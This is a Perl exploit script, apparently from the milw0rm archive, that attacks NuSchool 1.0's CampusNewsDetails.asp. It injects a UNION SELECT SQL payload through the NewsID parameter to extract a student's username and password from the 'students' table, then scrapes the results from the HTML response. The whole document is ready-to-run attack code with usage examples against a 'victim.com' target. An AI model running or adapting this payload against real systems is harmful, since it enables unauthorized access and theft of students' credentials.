#!/usr/bin/perl
#[Script Name: NuSchool 1.0 (CampusNewsDetails.asp) Remote SQL Injection Exploit
#[Coded by   : ajann
#[Author     : ajann
#[Contact    : :(

use IO::Socket;
if(@ARGV < 3){
print "
[========================================================================
[//  NuSchool 1.0 (CampusNewsDetails.asp) Remote SQL Injection Exploit
[//           Usage: exploit.pl [target] [path] [userid]
[//                   Example: exploit.pl victim.com / 1
[//                   Example: exploit.pl victim.com /path/ 1
[//                           Vuln&Exp : ajann
[========================================================================
";
exit();
}
#Local variables
$server = $ARGV[0];
$server =~ s/(http:\/\/)//eg;
$host = "http://".$server;
$port = "80";
$dir = $ARGV[1];
$file = "CampusNewsDetails.asp?NewsID=";
$target = "-1%20union%20select%2000,UserName,Password,0%20from%20students%20where%20StudentID%20like%20".$ARGV[2];
$target = $host.$dir.$file.$target;

#Writing data to socket
print "+**********************************************************************+\n";
print "+ Trying to connect: $server\n";
$socket = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$server", PeerPort => "$port") || die "\n+ Connection failed...\n";
print $socket "GET $target\n";
print $socket "Host: $server\n";
print $socket "Accept: */*\n";
print $socket "Connection: close\n\n";
print "+ Connected!...\n";
#Getting
while($answer = <$socket>) {
if ($answer =~ /<td width=\"21%\"><font size=\"2\" face=\"Arial, Helvetica, sans-serif\">(.*?)<\/font>/){ 
print "+ Exploit succeed! Getting admin information.\n";
print "+ ---------------- +\n";
print "+ Username: $1\n";
}

if ($answer =~ /<td colspan=\"2\"><font size=\"2\" face=\"Arial, Helvetica, sans-serif\">(.*?)<\/font>/){ 
print "+ Password: $1\n";
exit();
}

if ($answer =~ /Ad removed or not yet approved/) { 
print "+ Exploit Failed : ( \n";
print "+**********************************************************************+\n";
exit(); 
}

if ($answer =~ /Internal Server Error/) {
print "+ Exploit Failed : (  \n";
print "+**********************************************************************+\n";
exit(); 
}
 }
   
    
print "+ Exploit failed :(\n";
print "+**********************************************************************+\n";

# milw0rm.com [2006-11-11]
